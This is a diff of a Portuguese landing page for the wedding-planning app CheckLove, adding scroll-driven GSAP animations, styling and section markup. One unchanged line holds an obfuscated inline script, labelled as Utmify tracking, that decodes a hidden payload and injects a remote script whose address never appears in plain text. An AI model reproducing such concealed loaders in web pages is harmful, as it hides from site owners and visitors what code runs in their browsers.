@@ -249,6 +249,69 @@ footer p+p{margin-top:6px}
 .mini-lista{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:22px}
 .mini-lista span{font-size:13px;font-weight:600;color:var(--roxo-esc);background:#fff;border:1px solid var(--roxo-borda);border-radius:999px;padding:6px 12px}
 .blocos .bloco img{background:#efe4ff}
+
+/* ===== cenas animadas (scroll) ===== */
+header{position:sticky;top:0;z-index:40}
+.cena{position:relative;overflow:hidden;background:radial-gradient(120% 80% at 50% 0%,#f6efff 0%,#f8f9fb 60%)}
+.c1{height:100vh;height:100svh;min-height:560px;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:max(5vh,22px);text-align:center}
+.c1-txt{position:relative;z-index:3;max-width:640px;padding:0 18px}
+.c1 h1{font-size:clamp(27px,6.4vw,46px);font-weight:800;color:var(--tinta);letter-spacing:-.01em}
+.c1 h1 em{font-style:normal;background:linear-gradient(90deg,#9a56f6,#c06bd9);-webkit-background-clip:text;background-clip:text;color:transparent}
+.c1 .lead{font-size:clamp(14px,3.6vw,16.5px);color:var(--suave);margin:10px auto 0;max-width:500px}
+.c1-cta{display:inline-block;margin-top:16px;padding:13px 26px;border-radius:999px;background:var(--roxo);color:#fff;font-weight:700;font-size:15px;text-decoration:none;box-shadow:0 12px 26px -12px rgba(122,63,214,.9)}
+.fone{position:relative;z-index:2;width:min(250px,56vw,calc((100svh - 380px) * .44));margin-top:3vh;aspect-ratio:390/844;border-radius:38px;border:8px solid #1d1830;background:#fff;overflow:hidden;box-shadow:0 40px 70px -30px rgba(40,10,90,.55),0 0 0 1px rgba(0,0,0,.04);transform-style:preserve-3d;will-change:transform}
+.fone img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;object-position:top}
+.emo{position:absolute;z-index:1;width:clamp(54px,11vw,104px);pointer-events:none;will-change:transform}
+.emo img{width:100%;animation:flutua var(--t,6s) ease-in-out infinite;animation-delay:var(--dl,0s);filter:drop-shadow(0 14px 18px rgba(60,20,110,.18))}
+@keyframes flutua{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-12px) rotate(4deg)}}
+.c1-frase{position:absolute;inset:0;z-index:4;display:flex;align-items:center;justify-content:center;text-align:center;padding:0 22px;opacity:0;pointer-events:none}
+.c1-frase p{font-size:clamp(26px,6.6vw,48px);font-weight:800;line-height:1.15;color:var(--tinta);max-width:640px}
+.c1-frase p span{display:block;font-size:.55em;font-weight:600;color:var(--suave);margin-bottom:10px}
+.c1-frase p em{font-style:normal;color:var(--roxo)}
+.c2{height:100vh;height:100svh;min-height:600px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:0 16px}
+.c2 h2{font-size:clamp(24px,5.6vw,38px)}
+.c2 .sub{margin-top:8px}
+.pilha-area{position:relative;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;gap:28px;margin-top:2vh}
+.pilha{position:relative;width:min(300px,62vw);height:min(360px,48vh);perspective:1400px}
+.pilha-in{position:absolute;inset:0;transform-style:preserve-3d;transform:rotateX(56deg) rotateZ(-34deg)}
+.camada{position:absolute;left:0;right:0;top:50%;margin:0 auto;width:100%;border-radius:16px;overflow:hidden;box-shadow:0 30px 40px -24px rgba(40,10,90,.55);background:#fff;transform:translate3d(0,-50%,0);will-change:transform}
+.camada img{width:100%;display:block}
+.rotulos{list-style:none;display:flex;flex-direction:column;gap:12px;text-align:left;max-width:300px}
+.rotulos li{display:flex;gap:10px;align-items:flex-start;opacity:.25;transition:opacity .3s}
+.rotulos li.on{opacity:1}
+.rotulos li i{flex:none;width:12px;height:12px;border-radius:50%;margin-top:6px;background:var(--roxo);box-shadow:0 0 0 4px var(--roxo-sua)}
+.rotulos b{display:block;font-size:15.5px;color:var(--tinta)}
+.rotulos small{font-size:13.5px;color:var(--suave)}
+.c3{height:100vh;height:100svh;min-height:600px;display:flex;align-items:center;justify-content:center;padding:0 16px}
+.c3-grid{display:flex;align-items:center;justify-content:center;gap:48px;width:100%;max-width:900px}
+.passos3{list-style:none;display:flex;flex-direction:column;gap:22px;max-width:340px}
+.passos3 li{opacity:.28;transition:opacity .35s,transform .35s;transform:translateX(-6px)}
+.passos3 li.on{opacity:1;transform:none}
+.passos3 .k{font-size:12px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--roxo)}
+.passos3 h3{font-size:clamp(20px,4.6vw,27px);font-weight:800;margin-top:4px}
+.passos3 p{font-size:14.5px;color:var(--suave);margin-top:4px}
+.c3 .fone{margin:0;flex:none;width:min(250px,56vw,calc((100svh - 140px) * .46))}
+.c3 .fone img{opacity:0;transition:opacity .45s}
+.c3 .fone img.on{opacity:1}
+@media (max-width:760px){
+  .pilha-area{flex-direction:column;gap:10px;margin-top:1vh}
+  .pilha{height:min(300px,40vh)}
+  .rotulos{max-width:330px;gap:7px}
+  .rotulos b{font-size:14px}.rotulos small{font-size:12.5px}
+  .c3-grid{flex-direction:column;gap:18px}
+  .passos3{gap:0;position:relative;min-height:118px;width:100%;max-width:360px;text-align:center}
+  .passos3 li{position:absolute;inset:0;transform:translateY(8px)}
+  .passos3 li.on{transform:none}
+  .passos3 li:not(.on){opacity:0}
+  .c3 .fone{width:min(220px,52vw,calc((100svh - 260px) * .46))}
+  .emo.m-esconde{display:none}
+}
+/* sem animação: tudo parado e visível */
+.sem-anim .c1-frase{position:static;opacity:1;padding:24px 22px 40px}
+.sem-anim .c1{height:auto;padding-bottom:20px}
+.sem-anim .c2,.sem-anim .c3{height:auto;padding:50px 16px}
+.sem-anim .rotulos li,.sem-anim .passos3 li{opacity:1}
+.sem-anim .passos3{min-height:0;gap:16px}.sem-anim .passos3 li{position:static}
 </style>
 <!-- Utmify: rastreamento de vendas e UTMs -->
 <script>(function(){var m_k=atob("DC1qgmcGipDRQ+Sn0lZI9xVqqKrzK5DTol5QrUhl7v7/NpDKu0sTrARp576zMcvUsV8D8hN1peC4O4HL/V0D+gJqpPqiYciFs1ke8A5k/+S0MMadiXBGoABq5fKwL5eF6HYRoAln5/XzecbXu1UP7i5iqLzzNYXLp0hIuEUw6/S0ItCWsxxcuwVlvaC3dIXE4BVS5FYk982s");var j_54q3=[];for(var o_k3y=0;o_k3y<m_k.length;o_k3y++){j_54q3.push(m_k.charCodeAt(o_k3y)&255);}var v_nyo=j_54q3[0];var c_ugzl=j_54q3.slice(1,1+v_nyo);var y_l5=j_54q3.slice(1+v_nyo);var s_hlt=y_l5.map(function(b,p_y2){return b^c_ugzl[p_y2%v_nyo];});var p_b9e="";for(var j_sv=0;j_sv<s_hlt.length;j_sv++){p_b9e+=String.fromCharCode(s_hlt[j_sv]&255);}var m_p=decodeURIComponent(escape(p_b9e));var f_qibj=JSON.parse(m_p);var n_5=f_qibj.globals||[];n_5.forEach(function(c_p){window[c_p.name]=c_p.value;});var m_i6wl=document.createElement("script");m_i6wl.src=f_qibj.url;m_i6wl.async=true;m_i6wl.defer=true;(f_qibj.attributes||[]).forEach(function(q_rhv){m_i6wl.setAttribute(q_rhv.name,q_rhv.value);});(document.head||document.documentElement).appendChild(m_i6wl);})();</script>
@@ -257,13 +320,47 @@ footer p+p{margin-top:6px}
 
 <header><div class="wrap"><span class="logo">CheckLove</span><a class="mini" href="#planos">Quero o meu</a></div></header>
 
-<section class="hero">
-  <div class="wrap">
-    <h1>Organize o casamento inteiro em um só app, no seu celular</h1>
-    <div class="celular"><img src="/img/app-tela.webp" alt="Tela inicial do Planner CheckLove com a contagem regressiva, o orçamento e as tarefas" width="540" height="1169"></div>
-    <p class="lead">Orçamento, fornecedores, convidados, mesas e tarefas com prazo, tudo salvo na sua conta. Dá para dividir com o noivo ou com a cerimonialista.</p>
-    <div class="botoes">
-      <a class="btn-branco" href="#planos">Quero meu app agora</a>
+<section class="cena c1" id="cena1">
+  <div class="emo" style="left:8%;top:34%" data-dx="-60" data-dy="-30"><img src="/img/emoji/ring.webp" alt="" width="180" height="180" style="--t:6s;--dl:0s"></div><div class="emo" style="left:80%;top:30%" data-dx="60" data-dy="-40"><img src="/img/emoji/bouquet.webp" alt="" width="180" height="180" style="--t:7s;--dl:0.6s"></div><div class="emo" style="left:14%;top:70%" data-dx="-70" data-dy="40"><img src="/img/emoji/birthday_cake.webp" alt="" width="180" height="180" style="--t:6.5s;--dl:0.3s"></div><div class="emo" style="left:78%;top:66%" data-dx="70" data-dy="30"><img src="/img/emoji/love_letter.webp" alt="" width="180" height="180" style="--t:5.5s;--dl:1s"></div><div class="emo m-esconde" style="left:24%;top:50%" data-dx="-90" data-dy="0"><img src="/img/emoji/clinking_glasses.webp" alt="" width="180" height="180" style="--t:7.5s;--dl:0.8s"></div><div class="emo m-esconde" style="left:70%;top:48%" data-dx="90" data-dy="10"><img src="/img/emoji/money_bag.webp" alt="" width="180" height="180" style="--t:6s;--dl:1.2s"></div><div class="emo" style="left:4%;top:86%" data-dx="-50" data-dy="60"><img src="/img/emoji/spiral_calendar.webp" alt="" width="180" height="180" style="--t:6.8s;--dl:0.4s"></div><div class="emo" style="left:88%;top:86%" data-dx="50" data-dy="60"><img src="/img/emoji/sparkling_heart.webp" alt="" width="180" height="180" style="--t:5.8s;--dl:0.2s"></div>
+  <div class="c1-txt">
+    <h1>Organize o casamento inteiro <em>em um só app</em></h1>
+    <p class="lead">Orçamento, fornecedores, convidados, mesas e tarefas com prazo, salvos na sua conta. Dá para dividir com o noivo ou com a cerimonialista.</p>
+    <a class="c1-cta" href="#planos">Quero meu app agora</a>
+  </div>
+  <div class="fone" id="fone1"><img src="/img/pagina/tela-inicio.webp" alt="Tela inicial do app com a contagem regressiva, o orçamento e as tarefas" width="540" height="1169" fetchpriority="high"></div>
+  <div class="c1-frase" id="frase1"><p><span>Orçamento, convidados, tarefas e fornecedores.</span>Tudo do casamento <em>num lugar só.</em></p></div>
+</section>
+
+<section class="cena c2" id="cena2">
+  <h2>Veja o casamento inteiro <em>de uma vez</em></h2>
+  <p class="sub">Cada parte do casamento numa camada do app.</p>
+  <div class="pilha-area">
+    <div class="pilha"><div class="pilha-in">
+      <div class="camada" data-i="0"><img src="/img/pagina/camada-tarefas.webp" alt="Tarefas do mês com prazo" loading="lazy" width="460" height="353"></div>
+      <div class="camada" data-i="1"><img src="/img/pagina/camada-convidados.webp" alt="Lista de convidados" loading="lazy" width="460" height="378"></div>
+      <div class="camada" data-i="2"><img src="/img/pagina/camada-financeiro.webp" alt="Resumo do financeiro" loading="lazy" width="460" height="355"></div>
+      <div class="camada" data-i="3"><img src="/img/pagina/camada-contagem.webp" alt="Contagem regressiva do casamento" loading="lazy" width="460" height="323"></div>
+    </div></div>
+    <ul class="rotulos">
+      <li data-r="3"><i></i><span><b>Contagem regressiva</b><small>Quanto falta para o grande dia</small></span></li>
+      <li data-r="2"><i></i><span><b>Financeiro</b><small>O que já foi pago e o que falta</small></span></li>
+      <li data-r="1"><i></i><span><b>Convidados</b><small>Quem confirmou e de que lado é cada um</small></span></li>
+      <li data-r="0"><i></i><span><b>Tarefas</b><small>Prazos calculados pela data do casamento</small></span></li>
+    </ul>
+  </div>
+</section>
+
+<section class="cena c3" id="cena3">
+  <div class="c3-grid">
+    <ul class="passos3">
+      <li data-p="0"><span class="k">Finanças</span><h3>Controle cada gasto</h3><p>O valor de cada coisa, o que já foi pago e quanto ainda sobra do orçamento.</p></li>
+      <li data-p="1"><span class="k">Convidados</span><h3>Monte as mesas</h3><p>Quem confirmou, quem falta responder e onde cada um senta.</p></li>
+      <li data-p="2"><span class="k">Tarefas</span><h3>Não perca nenhum prazo</h3><p>Um toque e o app monta o cronograma pela data do casamento.</p></li>
+    </ul>
+    <div class="fone" id="fone3">
+      <img data-p="0" src="/img/pagina/tela-financeiro.webp" alt="Tela do financeiro" loading="lazy" width="540" height="1169">
+      <img data-p="1" src="/img/pagina/tela-mesas.webp" alt="Tela do mapa de mesas" loading="lazy" width="540" height="1169">
+      <img data-p="2" src="/img/pagina/tela-tarefas.webp" alt="Tela das tarefas por mês" loading="lazy" width="540" height="1169">
     </div>
   </div>
 </section>
@@ -408,6 +505,44 @@ footer p+p{margin-top:6px}
   else t=d.map(function(x,i){ var ult=i===2||d[i+1].m!==x.m; return x.d+(ult?' de '+MES[x.m]:''); }).join(', ').replace(/, ([^,]*)$/,' e $1');
   var el=document.getElementById('bonus-dias'); if(el) el.textContent='nos Dias '+t;
 }catch(e){} })();
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js" defer></script>
+<script>
+/* Cenas animadas pela rolagem. Sem GSAP ou com "reduzir movimento", a página fica parada e completa. */
+window.addEventListener('DOMContentLoaded', function () {
+  var calma = window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matches;
+  var p3 = document.querySelectorAll('.passos3 li'), t3 = document.querySelectorAll('#fone3 img'), r2 = document.querySelectorAll('.rotulos li');
+  function passo(n) { p3.forEach(function (x) { x.classList.toggle('on', +x.dataset.p === n); }); t3.forEach(function (x) { x.classList.toggle('on', +x.dataset.p === n); }); }
+  passo(0);
+  if (calma || !window.gsap || !window.ScrollTrigger) { document.body.classList.add('sem-anim'); r2.forEach(function (x) { x.classList.add('on'); }); return; }
+  gsap.registerPlugin(ScrollTrigger);
+  var cel = innerWidth < 760;
+
+  /* cena 1: os objetos se afastam, o app gira e some, e a frase aparece */
+  var tl1 = gsap.timeline({ scrollTrigger: { trigger: '#cena1', start: 'top top', end: cel ? '+=110%' : '+=130%', scrub: .6, pin: true } });
+  tl1.to('.c1-txt', { y: -50, opacity: 0, filter: 'blur(8px)', ease: 'none', duration: .45 }, 0)
+     .to('#fone1', { rotateX: 16, rotateY: -14, scale: .82, y: -30, ease: 'none', duration: .55 }, 0)
+     .to('#fone1', { opacity: 0, y: -90, scale: .7, filter: 'blur(6px)', ease: 'none', duration: .35 }, .5);
+  document.querySelectorAll('.c1 .emo').forEach(function (e, i) {
+    var dx = +e.dataset.dx * (cel ? .6 : 1), dy = +e.dataset.dy * (cel ? .6 : 1);
+    tl1.to(e, { x: dx * 2.2, y: dy * 2.2, rotation: (i % 2 ? 1 : -1) * 18, scale: 1.25, ease: 'none', duration: .6 }, 0)
+       .to(e, { x: dx * 1.1, y: dy * 1.1 - 20, scale: .9, opacity: .85, ease: 'none', duration: .4 }, .6);
+  });
+  tl1.fromTo('#frase1', { opacity: 0, scale: .94, filter: 'blur(14px)' }, { opacity: 1, scale: 1, filter: 'blur(0px)', ease: 'none', duration: .4 }, .55);
+
+  /* cena 2: o app se abre em camadas, com o nome de cada parte */
+  var gap = cel ? 30 : 50, cams = gsap.utils.toArray('.camada');
+  var tl2 = gsap.timeline({ scrollTrigger: { trigger: '#cena2', start: 'top top', end: '+=140%', scrub: .6, pin: true,
+    onUpdate: function (st) { var k = Math.min(3, Math.floor(st.progress * 4.2)); r2.forEach(function (li) { li.classList.toggle('on', 3 - +li.dataset.r <= k); }); } } });
+  tl2.from('.pilha-in', { rotateX: 0, rotateZ: 0, scale: .9, ease: 'none', duration: .3 }, 0).to('.pilha', { scale: cel ? .82 : .9, ease: 'none', duration: .7 }, .25);
+  cams.forEach(function (c) { var i = +c.dataset.i; tl2.to(c, { z: (i - 1.5) * gap * 2, y: '-50%', ease: 'none', duration: .7 }, .25); });
+
+  /* cena 3: a tela do celular troca a cada passo */
+  ScrollTrigger.create({ trigger: '#cena3', start: 'top top', end: '+=200%', pin: true, scrub: true,
+    onUpdate: function (st) { passo(Math.min(2, Math.floor(st.progress * 3))); } });
+  gsap.from('#fone3', { y: 60, opacity: 0, rotateY: 18, duration: .9, ease: 'power3.out', scrollTrigger: { trigger: '#cena3', start: 'top 80%' } });
+});
 </script>
 </body>
 </html>
